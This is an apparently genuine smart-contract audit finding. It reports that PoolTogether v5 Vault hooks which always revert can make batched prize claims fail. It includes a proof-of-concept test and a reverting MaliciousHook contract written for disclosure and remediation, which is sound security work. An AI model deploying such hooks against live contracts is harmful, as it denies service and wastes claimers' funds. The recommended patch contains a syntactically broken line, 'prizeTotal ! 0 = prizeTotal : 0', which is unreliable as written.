# [M] M-02 - Malicious users can set their hooks to contracts that will always revert, causing Claimers to get their tx to claim the user's prizes to be reverted

## Summary
Severity: Medium
Chain: Smart contract
Component: 2023-08-pooltogether-mitigation
Published: 2023-08-24
Source: https://github.com/code-423n4/2023-08-pooltogether-mitigation-findings/issues/69
Type: code-finding

## Details
# Lines of code

https://github.com/GenerationSoftware/pt-v5-vault/blob/main/src/Vault.sol#L1318-L1357


# Vulnerability details

# Title
M-02 - Malicious users can set their hooks to contracts that will always revert, causing Claimers to get their tx to claim the user's prizes to be reverted


## Original Issue
[M-02 - Unintended or Malicious Use of Prize Winners' Hooks](https://github.com/code-423n4/2023-07-pooltogether-findings/issues/465)

## Details
The previous implementation claimed the prizes for all the winners in one single transaction, each winner was allowed to set arbitrary hooks that would cause the Vault contract to perform arbitrary calls to the address of the user's hooks.
As the original issue mentions, some consequences of allowing executions to arbitrary addresses are unauthorized side transactions with gas paid unbeknownst to the claimer, reentrant calls, or denial-of-service attacks on claiming transactions.

## Mitigation
The mitigation implements a limit of gas that can be spent on each hook's call, and now the hook's call is made using a try-catch block.

The issue about causing DoS on other users is still present, when using a Claimer to claim a user's prizes in batches, if at least one of the hook's calls reverts, the whole tx claim the user's prizes will be reverted.

```solidity
  function claimPrize(
    ...
  ) external onlyClaimer returns (uint256) {
    ...

    if (hooks.useBeforeClaimPrize) {
      try
        hooks.implementation.beforeClaimPrize{ gas: HOOK_GAS }(
          _winner,
          _tier,
          _prizeIndex,
          _fee,
          _feeRecipient
        )
      returns (address result) {
        recipient = result;
      } catch (bytes memory reason) {
        revert BeforeClaimPrizeFailed(reason);
      }
    } else {
      recipient = _winner;
    }

    ...

    if (hooks.useAfterClaimPrize) {
      try
        hooks.implementation.afterClaimPrize{ gas: HOOK_GAS }(
          _winner,
          _tier,
          _prizeIndex,
          prizeTotal,
          recipient
        )
      {} catch (bytes memory reason) {
        revert AfterClaimPrizeFailed(reason);
      }
    }

    return prizeTotal;
  }
```

### Conclusion of the Mitigation and Proof of Concept of the New Bug
The mitigation solves most of the problems described in the original issue, but the problem of causing DoS to claim other user's prizes is still present.
- As part of the mitigation, now the hook's calls are made in a try-catch block, and if the hook's call fails, a revert() is executed, and the whole tx to claim prizes will be reverted.

- The underlying problem is the same described as in the original issue, this time, a malicious user can set a malicious contract that will always revert as the hook of its account, this will cause when this contract is called, the tx to claim prizes will revert, causing losses to claimers, because the gas they spent attempting to claim the prizes will be paid regardless the tx is reverted or not.
  - If claimers are continuously getting their tx reverted because of malicious hooks they might be disincentivized from continuing to offer themselves to claim the prizes on behalf of the users.

```solidity
  function claimPrize(
    ...
  ) external onlyClaimer returns (uint256) {
    ...

    if (hooks.useBeforeClaimPrize) {
      try
        hooks.implementation.beforeClaimPrize{ gas: HOOK_GAS }(
          _winner,
          _tier,
          _prizeIndex,
          _fee,
          _feeRecipient
        )
      returns (address result) {
        recipient = result;
      } catch (bytes memory reason) {
        //@audit-issue => Malicious hooks can force a revert which will cause the whole tx to be reverted
        revert BeforeClaimPrizeFailed(reason);
      }
    } else {
      recipient = _winner;
    }

    ...

    if (hooks.useAfterClaimPrize) {
      try
        hooks.implementation.afterClaimPrize{ gas: HOOK_GAS }(
          _winner,
          _tier,
          _prizeIndex,
          prizeTotal,
          recipient
        )
      {} catch (bytes memory reason) {
        //@audit-issue => Malicious hooks can force a revert which will cause the whole tx to be reverted
        revert AfterClaimPrizeFailed(reason);
      }
    }

    return prizeTotal;
  }
```

Flow to claim prizes when a Claimer is enabled:
- [Claimer::claimPrizes()](https://github.com/GenerationSoftware/pt-v5-claimer/blob/main/src/Claimer.sol#L91-L117) ==> [Vault::claimPrize()](https://github.com/GenerationSoftware/pt-v5-vault/blob/main/src/Vault.sol#L1308-L1360) ==> hookBefore() && [PrizePool::claimPrize()](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/main/src/PrizePool.sol#L415-L492) && hookAfter()

  - The claimer will try to claim the prizes for all the winners, it will iterate over the list of winners and will call individuall the Vault::claimPrize() function where it will execute hooks (if they are enabled) and claim the prizes in the PrizePool, if the claiming for that winner succeeds, the flow goes back to Claimer::claimPrizes(), where it will call again the Vault::claimPrize() for the next winner.
    - If one winner has a malicious contract as its hook that forces a revert, the claiming for all the users will be reverted.

### Coded PoC
- Add the next test to the [`Vault.t.sol`](https://github.com/GenerationSoftware/pt-v5-vault/blob/main/test/unit/Vault/Vault.t.sol) test file in the Vault repository
```solidity
function testClaimPrizeMaliciousHookPoC() public {
  MaliciousHook maliciousHook = new MaliciousHook();
  vm.startPrank(alice);
  VaultHooks memory hooks = VaultHooks({
    useBeforeClaimPrize: true,
    useAfterClaimPrize: false,
    implementation: IVaultHooks(address(maliciousHook))
  });
  vault.setHooks(hooks);
  vm.stopPrank();

  vm.startPrank(address(claimer));

  mockPrizePoolClaimPrize(uint8(1), alice, 0, address(maliciousHook), 1e18, address(claimer));
  claimPrize(uint8(1), alice, 0, 1e18, address(claimer));

  vm.stopPrank();
}
```

- Create the `MaliciousHook.sol` contract in the [src/ folder](https://github.com/GenerationSoftware/pt-v5-vault/tree/main/src)
```solidity
// SPDX-License_Identifier: MIT
pragma solidity ^0.8.19;

contract MaliciousHook {

  function beforeClaimPrize(
    address winner,
    uint8 tier,
    uint32 prizeIndex
  ) external returns (address) {
    revert("Forcing to revert");
  }

}
```

- Run the PoC, this is the expected result:
> forge test --match-test testClaimPrizeMaliciousHookPoC
```
Running 1 test for test/unit/Vault/Vault.t.sol:VaultTest
[FAIL. Reason: BeforeClaimPrizeFailed(0x)] testClaimPrizeMaliciousHookPoC() (gas: 140886)
Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 7.24ms
Ran 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/unit/Vault/Vault.t.sol:VaultTest
[FAIL. Reason: BeforeClaimPrizeFailed(0x)] testClaimPrizeMaliciousHookPoC() (gas: 140886)

Encountered a total of 1 failing tests, 0 tests succeeded
```

## Impact
Claimers can get their TX reverted if a malicious winner sets his hook to a malicious contract that will always revert, which will cause the whole tx to claim the user's prizes to be reverted.

## Recommended Mitigation Steps
- The mitigation for this issue would be to instead of reverting the tx, just emit an event and return a 0 (this indicates that 0 prizes were claimed for that winner), In this way, the tx to claim prizes will continue its execution and will be able to claim the prizes for the rest of winners.

```solidity
  function claimPrize(
    ...
  ) external onlyClaimer returns (uint256) {
    ...

    if (hooks.useBeforeClaimPrize) {
      try
        hooks.implementation.beforeClaimPrize{ gas: HOOK_GAS }(
          _winner,
          _tier,
          _prizeIndex,
          _fee,
          _feeRecipient
        )
      returns (address result) {
        recipient = result;
      } catch (bytes memory reason) {
-       revert BeforeClaimPrizeFailed(reason);
+       emit BeforeHookExecutionFailed(_winner,reason);
+       return 0;
      }
    } else {
      recipient = _winner;
    }

    ...

    if (hooks.useAfterClaimPrize) {
      try
        hooks.implementation.afterClaimPrize{ gas: HOOK_GAS }(
          _winner,
          _tier,
          _prizeIndex,
          prizeTotal,
          recipient
        )
      {} catch (bytes memory reason) {
-       revert AfterClaimPrizeFailed(reason);
+       emit AfterHookExecutionFailed(_winner,reason);
        //@audit-info => In case the prizes were claimed, so fees are charged!
+       uint claimed = prizeTotal ! 0 = prizeTotal : 0;
+       return claimed;
      }
    }

    return prizeTotal;
  }
```






## Assessed type

Context
